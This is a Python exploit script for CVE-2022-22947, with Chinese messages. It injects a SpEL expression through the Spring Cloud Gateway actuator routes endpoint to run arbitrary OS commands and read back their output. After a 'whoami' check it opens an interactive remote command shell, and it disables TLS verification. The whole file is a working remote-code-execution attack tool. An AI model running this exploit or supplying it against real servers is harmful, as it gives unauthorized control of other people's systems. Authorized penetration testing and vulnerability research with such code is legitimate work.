import requests
import random
import string
import json
import sys
import re

import warnings
warnings.filterwarnings('ignore')

def getargs():
    if (len(sys.argv) == 2):
        if re.findall('^http[s]?://.+\.[0-9a-zA-Z]+[:]?[1-6]?[0-9]?[0-9]?[0-9]?[0-9]?[/]?$',sys.argv[1]):
            target = re.findall('^http[s]?://.+\.[0-9a-zA-Z]+[:]?[1-6]?[0-9]?[0-9]?[0-9]?[0-9]?',sys.argv[1])[0]
            return target
        else:
            print('URL参数错误！格式：http(https)://www.baidu.com[:prot]')
            exit()
    else:
        print('参数错误！使用：python CVE-2022-22947.py target')
        exit()

def rce(target,cmd,flag=False):
    rand_str = ''.join(random.sample(string.digits + string.ascii_letters, 7))
    headers1 = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36",
        "Content-Type": "application/json"
    }

    headers2 = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36",
        "Content-Type": "application/x-www-form-urlencoded"
    }

    data = {
        "id": rand_str,
        "filters": [{
            "name": "AddResponseHeader",
            "args": {
                "name": "Result",
                "value": "#{new java.lang.String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(\""+ cmd +"\").getInputStream()))}"
            }
        }],
        "uri": "http://127.0.0.1",
        "order": 0
    }

    url = target + "/actuator/gateway/routes/" + rand_str
    try:
        rep1 = requests.post(url=url, headers=headers1, data=json.dumps(data, ensure_ascii=False), verify=False)
        if rep1.status_code == 201:
            requests.post(url=target + "/actuator/gateway/refresh", headers=headers2, verify=False)
            rep = requests.get(url=url, headers=headers2, verify=False)
            requests.delete(url=url, headers=headers2, verify=False)
            if rep.status_code == 200:
                if flag == False:
                    print("[+] 漏洞存在！")
                return True,rep.content.decode()
            else:
                # print("[-] 请求异常！",url,rep.status_code)
                return True,False
        else:
            print("[-] 漏洞不存在！")
            return False,False
    except Exception as e:
        print("[-] 检测失败！")
        print("[-]",e)
        return False,False

def print_res(rep_data):
    if rep_data and re.findall("AddResponseHeader Result = '(.*)'], order",rep_data):
        # print("[+] 命令回显结果：")
        res = re.findall("AddResponseHeader Result = '(.*)'], order",rep_data)[0]
        res = res.split("\\n")
        for i in res:
            print(i)
    else:
        print("[*] 检查一下命令是否输入正确吧？或者是执行的命令没有回显。")


if __name__ == '__main__':
    target = getargs()
    flag = rce(target,"whoami")[0]
    # print(flag)
    if flag == True:
        while True :
            cmd = input("[+] shell >>")
            if cmd == 'exit':
                break
            rep_data = rce(target,cmd,True)
            if rep_data[0]:
                print_res(rep_data[1])

